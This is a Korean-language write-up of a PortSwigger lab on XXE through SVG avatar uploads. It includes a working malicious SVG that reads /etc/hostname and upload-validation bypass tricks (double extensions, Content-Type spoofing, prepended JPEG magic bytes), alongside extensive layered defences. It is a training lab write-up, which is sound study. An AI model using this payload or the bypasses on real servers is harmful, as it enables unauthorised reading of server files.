# Lab: Exploiting XXE via image file upload

## 개요

- **난이도**: Practitioner
- **주제**: XXE — SVG 파일 업로드 / XML 기반 이미지 포맷 / 파일 업로드 검증 우회
- **링크**: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

## 목표

댓글 기능의 아바타 이미지 업로드에 SVG 파일을 업로드한다. SVG 는 XML 기반 포맷이므로 XXE 페이로드를 삽입할 수 있고, 서버가 SVG 를 렌더링할 때 XML 파서가 외부 엔티티를 처리해 파일 내용이 이미지에 포함된다.

## 007 랩(XInclude)과의 차이

```
[007 랩 — 폼 파라미터 XInclude]
  Content-Type: x-www-form-urlencoded
  파라미터 값으로 XML 요소 삽입
  서버가 값을 XML 에 조립

[008 랩 (이번) — 파일 업로드 XXE]
  파일 업로드 기능
  SVG 파일 자체가 XML 문서
  DOCTYPE + ENTITY 직접 삽입 가능 (001 랩 방식)
  서버가 이미지를 렌더링할 때 파서 동작
```

## SVG 와 XML

```
SVG (Scalable Vector Graphics):
  XML 기반 벡터 이미지 포맷
  .svg 확장자, text/svg+xml MIME 타입

SVG 파일 구조:
  <?xml version="1.0"?>
  <svg xmlns="http://www.w3.org/2000/svg">
    <circle cx="50" cy="50" r="40"/>
    <text x="0" y="20">Hello</text>
  </svg>

→ 일반 XML 문서와 동일한 구조
→ DOCTYPE, ENTITY 선언 가능
→ XXE 공격 그대로 적용
```

## 악성 SVG 파일

### 페이로드

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="12" x="0" y="20">&xxe;</text>
</svg>
```

### 구조 분석

```
<?xml version="1.0" standalone="yes"?>
  → standalone="yes": 외부 DTD 참조 없음 선언
  → 일부 파서에서 필요

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
  → 001 랩과 동일한 외부 엔티티 선언
  → /etc/hostname: 파일명이 짧아 SVG 텍스트에 표시하기 적합
  → /etc/passwd 도 가능 (내용이 길어 잘릴 수 있음)

<svg xmlns="http://www.w3.org/2000/svg">
  → SVG 루트 요소 + 네임스페이스

<text font-size="12" x="0" y="20">&xxe;</text>
  → &xxe; 참조 → /etc/hostname 내용으로 치환
  → SVG 텍스트 요소에 파일 내용이 렌더링
  → 업로드된 이미지를 브라우저로 열면 파일 내용이 보임
```

### 실행 흐름

```
1. 악성 SVG 파일 생성 (위 내용)
   파일명: avatar.svg

2. 댓글 작성 시 아바타 이미지로 업로드

3. 서버: SVG 파일 수신
   → 이미지 처리 라이브러리가 SVG 파싱
   → XML 파서가 DOCTYPE, ENTITY 처리
   → &xxe; → file:///etc/hostname 읽기
   → SVG <text> 요소에 파일 내용 삽입

4. 서버: 처리된 SVG 를 저장/반환

5. 브라우저에서 댓글 페이지 로드
   → 아바타 이미지(SVG) 렌더링
   → <text> 에 /etc/hostname 내용이 표시됨

6. SVG 이미지 URL 직접 접근 또는 렌더링 결과에서 확인
```

## 파일 업로드 검증과 방어

### 사용자 언급: "파일의 type을 이용해서 방어"

파일 업로드 검증은 3가지 레이어가 모두 적용되어야 한다:

### 1. 확장자 검증 (Extension Validation)

```
클라이언트/서버가 파일명의 확장자를 확인:
  avatar.svg → .svg → 차단 (SVG 허용 안 함)
  avatar.jpg → .jpg → 허용

우회 방법:
  avatar.svg.jpg   → 마지막 확장자만 검사하면 우회
  avatar.jpg       → 실제 내용은 SVG (확장자만 변경)
  Content-Disposition: filename="avatar.jpg" → 서버가 이름만 신뢰

한계:
  파일명/확장자는 클라이언트가 조작 가능
  단독으로는 불충분
```

### 2. Content-Type 검증 (MIME 타입 검증)

```
HTTP 헤더의 Content-Type 확인:
  Content-Type: image/jpeg → 허용
  Content-Type: image/svg+xml → 차단

우회 방법:
  Burp Suite 로 Content-Type 헤더 수정:
    Content-Type: image/svg+xml → image/jpeg 로 변경
  → 서버가 헤더만 신뢰하면 우회

한계:
  Content-Type 은 클라이언트가 조작 가능
  단독으로는 불충분
```

### 3. 파일 내용 검증 (Magic Bytes / 시그니처 검증)

```
파일 실제 내용의 시작 바이트(Magic Bytes) 확인:

PNG: 89 50 4E 47 0D 0A 1A 0A  (‰PNG....)
JPEG: FF D8 FF                 (ÿØÿ)
GIF: 47 49 46 38               (GIF8)
SVG: 3C 3F 78 6D 6C            (<?xml 또는 <svg)

악성 SVG:
  <?xml version="1.0"... → XML 시그니처
  서버가 Magic Bytes 검사 시 SVG/XML 로 감지 → 차단

우회 시도:
  JPEG 헤더(FF D8 FF) + SVG 내용 조합
  → 일부 파서가 JPEG 헤더 이후 내용도 XML 로 파싱하면 위험
  → 파서 구현에 따라 다름
```

### 종합 방어 전략

```
[다층 검증 — 모두 적용 필요]

레이어 1: 확장자 화이트리스트
  허용: .jpg, .jpeg, .png, .gif
  차단: .svg, .xml, .html 등

레이어 2: Content-Type 검증
  허용: image/jpeg, image/png, image/gif
  차단: image/svg+xml, text/xml, application/xml

레이어 3: Magic Bytes 검증
  파일 실제 내용으로 포맷 확인
  → 확장자/헤더 조작 우회 차단

레이어 4: SVG 업로드 허용 시
  XML 파서의 외부 엔티티 비활성화
  SVG sanitize 라이브러리 적용
  (DOCTYPE, ENTITY, SCRIPT 제거)

레이어 5: 업로드 파일 저장 위치
  웹 루트 외부 저장
  또는 CDN/별도 도메인으로 서빙
  → XSS, XXE 실행 컨텍스트 분리
```

## SVG 가 허용되어야 할 때의 방어

```
SVG 를 완전히 차단하면 되지만,
디자인 도구, 아이콘 업로드 등 SVG 가 필요한 경우:

1. SVG Sanitizer 적용:
   DOCTYPE, ENTITY 제거
   외부 참조(href, xlink:href) 필터링
   스크립트 태그 제거

2. XML 파서 설정:
   외부 엔티티 비활성화
   DTD 처리 비활성화

3. 이미지로 래스터화:
   SVG → PNG/JPEG 로 변환 후 저장
   → 원본 SVG 의 XML 구조 제거
   → XXE, XSS 모두 차단
   → ImageMagick, librsvg 등 사용
   (단, ImageMagick 자체 취약점 주의)

4. 별도 도메인 서빙:
   uploads.example.com 에서 서빙
   → 메인 도메인 쿠키와 분리
   → XSS 영향 범위 축소
```

## 핵심 정리

- SVG 는 XML 기반 포맷이므로 DOCTYPE + ENTITY 선언이 가능하고, 서버가 SVG 를 처리할 때 XML 파서가 외부 엔티티를 실행한다.
- 파일 업로드 검증은 확장자 + Content-Type + Magic Bytes(파일 내용 시그니처) 세 레이어가 모두 적용되어야 한다 — 하나만으로는 우회 가능하다.
- SVG 업로드가 필요한 경우 PNG/JPEG 로 래스터화 변환이 XXE + XSS 를 동시에 차단하는 가장 효과적인 방어다.

## 배운 점 및 추가 학습

### 1. XML 기반 파일 포맷 종류

```
XXE 공격이 가능한 파일 포맷:

직접 XML:
  .svg  → SVG 이미지
  .xml  → XML 문서
  .xsl  → XSLT 스타일시트
  .rss  → RSS 피드

ZIP + XML (압축 해제 후 내부 XML 파싱):
  .xlsx → Excel (xl/workbook.xml 등)
  .docx → Word (word/document.xml 등)
  .pptx → PowerPoint
  .odt  → OpenDocument

기타:
  .pdf  → 일부 구현에서 XML 처리
  .epub → ZIP + XML
```

### 2. 001~008 XXE 공격 경로 종합

| 랩 | 진입점 | Content-Type | 기법 |
|----|--------|-------------|------|
| 001 | stock check | application/xml | ENTITY 파일 읽기 |
| 002 | stock check | application/xml | ENTITY SSRF |
| 003 | stock check | application/xml | 일반 엔티티 OOB |
| 004 | stock check | application/xml | 파라미터 엔티티 OOB |
| 005 | stock check | application/xml | 외부 DTD + OOB 탈취 |
| 006 | stock check | application/xml | 외부 DTD + 에러 탈취 |
| 007 | stock check | x-www-form-urlencoded | XInclude |
| 008 | 파일 업로드 | multipart/form-data | SVG XXE |
